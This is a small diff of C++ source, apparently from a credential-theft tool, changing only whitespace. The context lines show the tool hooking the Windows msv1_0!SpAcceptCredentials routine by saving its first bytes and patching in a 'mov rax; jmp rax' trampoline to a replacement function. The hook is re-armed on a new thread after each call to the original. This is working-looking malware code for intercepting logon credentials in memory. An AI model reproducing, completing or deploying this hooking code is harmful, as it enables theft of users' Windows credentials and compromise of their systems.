@@ -370,7 +370,7 @@ NTSTATUS NTAPI hookedSpAccecptedCredentials(SECURITY_LOGON_TYPE LogonType, PUNIC
 
 	// hook msv1_0!SpAcceptCredentials again with a delay so that originalSpAcceptCredentials() can execute
 	CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)installSpAccecptedCredentialsHook, NULL, NULL, NULL);
-	
+
 	// call original msv1_0!SpAcceptCredentials
 	return originalSpAcceptCredentials(LogonType, AccountName, PrimaryCredentials, SupplementalCredentials);
 }
@@ -391,7 +391,7 @@ void installSpAccecptedCredentialsHook()
 
 	// store first sizeof(bytesToRestoreSpAccecptedCredentials) bytes of the original msv1_0!SpAcceptCredentials routine
 	std::memcpy(bytesToRestoreSpAccecptedCredentials, addressOfSpAcceptCredentials, sizeof(bytesToRestoreSpAccecptedCredentials));
-	
+
 	// hook msv1_0!SpAcceptCredentials with "mov rax, hookedSpAccecptedCredentials; jmp rax";
 	DWORD_PTR addressBytesOfhookedSpAccecptedCredentials = (DWORD_PTR)&hookedSpAccecptedCredentials;
 	std::memcpy(bytesToPatchSpAccecptedCredentials + 2, &addressBytesOfhookedSpAccecptedCredentials, sizeof(&addressBytesOfhookedSpAccecptedCredentials));
